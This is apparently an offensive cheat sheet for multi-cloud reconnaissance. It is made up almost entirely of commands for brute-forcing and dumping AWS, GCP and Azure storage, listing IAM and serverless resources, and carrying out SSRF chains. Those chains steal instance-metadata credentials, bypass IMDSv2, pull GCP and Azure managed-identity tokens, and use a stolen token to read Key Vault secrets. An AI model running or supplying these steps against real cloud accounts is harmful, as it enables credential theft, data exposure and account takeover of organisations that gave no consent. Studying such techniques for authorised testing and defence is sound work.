# Cloud Asset Discovery: Multi-Cloud Enumeration

## AWS Enumeration

### S3 Bucket Discovery
```bash
# Brute force bucket names
s3scanner -bucket-file bucket_names.txt
s3scanner -bucket-file bucket_names.txt -dump  # Dump open buckets

# S3BucketList (word-based enumeration)
python3 s3-buckets-finder.py target

# Grayhat Warfare (known bucket database)
# https://buckets.grayhatwarfare.com/

# Check bucket configurations
aws s3api get-bucket-acl --bucket target-backup
aws s3api get-bucket-policy --bucket target-backup
aws s3api get-bucket-website --bucket target-backup
aws s3api get-public-access-block --bucket target-backup
```

### AWS-Specific Discovery
```bash
# Route53 enumeration (subdomains via DNS)
# If AWS keys available:
aws route53 list-hosted-zones
aws route53 list-resource-record-sets --hosted-zone-id ZONEID

# CloudFront distribution discovery
aws cloudfront list-distributions

# EC2 global IP ranges
curl -s https://ip-ranges.amazonaws.com/ip-ranges.json | jq '.prefixes[] | select(.service=="EC2")'

# IAM enumeration
aws iam list-users
aws iam list-roles
aws iam list-policies

# Lambda inspection
aws lambda list-functions
aws lambda get-function --function-name NAME

# API Gateway discovery
aws apigateway get-rest-apis
aws apigateway get-stages --rest-api-id ID

# ECR (container registries)
aws ecr describe-repositories
aws ecr list-images --repository-name NAME
```

### AWS SSRF to Account Compromise
Full chain:
1. Find SSRF parameter (url=, file=, redirect=, etc.)
2. Hit IMDS: http://169.254.169.254/latest/meta-data/
3. List IAM roles: /iam/security-credentials/
4. Get credentials for role
5. aws sts get-caller-identity (verify)
6. Enumerate all services with compromised role

### IMDSv2 Bypass
```bash
# If IMDSv2 enforced, SSRF must control HTTP method
# PUT to /latest/api/token with header:
# X-aws-ec2-metadata-token-ttl-seconds: 21600
# Returns token, use in GET: X-aws-ec2-metadata-token: $TOKEN

# SSRF via header injection (Typebot.io CVE-2025 pattern)
# If SSRF allows header injection -> can do PUT for IMDSv2 token

# DNS rebinding bypass
# Use 2nd-level DNS resolution to bypass 169.254.x.x block
```

## GCP Enumeration

### Storage Buckets
```bash
# gsutil enumeration (if GCP creds)
gsutil ls
gsutil ls gs://target-bucket

# Brute force via DNS
curl -s https://storage.googleapis.com/target-config/
curl -s https://target-config.storage.googleapis.com/

# Python bucket brute force
python3 gcpbucketbrute.py -k target
```

### GCP SSRF Chain
```bash
# Metadata endpoint (requires Metadata-Flavor: Google header)
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Legacy endpoints (may not require header)
http://metadata.google.internal/computeMetadata/v1beta1/
http://0xaddress.google.internal/

# Recursive metadata dump
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/?recursive=true"
```

## Azure Enumeration

### Storage Accounts
```bash
# Brute force
python3 MicroBurst.py -u https://target.blob.core.windows.net

# Check anonymous access
curl -s https://target.blob.core.windows.net/?restype=container&comp=list

# Azure function apps
curl -s https://target-app.azurewebsites.net/api/
curl -s https://target-func.azurewebsites.net/api/functions/admin/token
```

### Azure SSRF Chain
```bash
# Managed Identity token requires:
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com" -H "Metadata: true"

# Key Vault access with token
curl "https://target-vault.vault.azure.net/secrets/?api-version=7.0" -H "Authorization: Bearer $TOKEN"

# Azure WireServer (may not require metadata header)
curl http://168.63.129.16/?comp=goalstate
```

## Multi-Cloud Tools
```bash
# cloud_enum (AWS, Azure, GCP)
cloud_enum -k target

# CloudScraper
cloudscraper target.com -t 100 -o cloud_assets.txt

# Shodan cloud search
# org:"Target Inc"
# ssl:target.com
# http.title:"target"

# Censys cloud search
# services.service_name: HTTP AND services.tls.certificates.leaf_data.subject.organization:"Target Inc"

# FOFA search
# app="Target-Product"
# domain="target.com"
```
